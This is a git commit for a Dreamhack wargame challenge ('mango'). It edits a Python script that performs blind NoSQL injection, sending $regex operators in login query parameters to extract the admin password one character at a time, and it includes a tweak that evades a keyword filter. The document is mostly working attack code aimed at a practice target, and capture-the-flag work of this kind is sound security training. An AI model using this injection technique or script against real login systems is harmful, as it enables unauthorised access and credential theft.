f2a08fe047b57fbd674f0a17ef185327c827f121
1-EXON <exon.indiv@gmail.com>
2022-11-20 22:41:26 +0900

    해결!!!

--- L1/mango/hack.py
+++ L1/mango/hack.py
@@ -2,26 +2,32 @@ import requests
 import time
 import string
 
-url ='http://host3.dreamhack.games:16889/login?uid[$regex]=^adm.n&upw[$regex]=^{val}'
-letters = string.digits + string.ascii_letters
+url ='http://host3.dreamhack.games:20785/login?uid[$regex]=^adm.n&upw[$regex]=^{val}'
+letters = '{}' + string.digits + string.ascii_letters
 pw_length = 36 # 그냥 손으로 함
 
-password = ''
+password = 'D.'
+result = 'DH'
 try:
-    for i in range(pw_length):
+    for i in range(2, pw_length):
         for letter in letters:
             new_url = url.format(val=password + letter)
             print(new_url)
             data = requests.get(new_url).text
             print(password + letter)
             time.sleep(0.5)
+            if 'filter' in data:
+                print('FILTER*****************************************')
             if 'admin' in data:
                 password += letter
+                result += letter
+                password = password.replace('f', '.').replace('{', '.')
                 print(password)
                 break
 except:
     print('error')
 
+print(result)
 print(password)
         
     
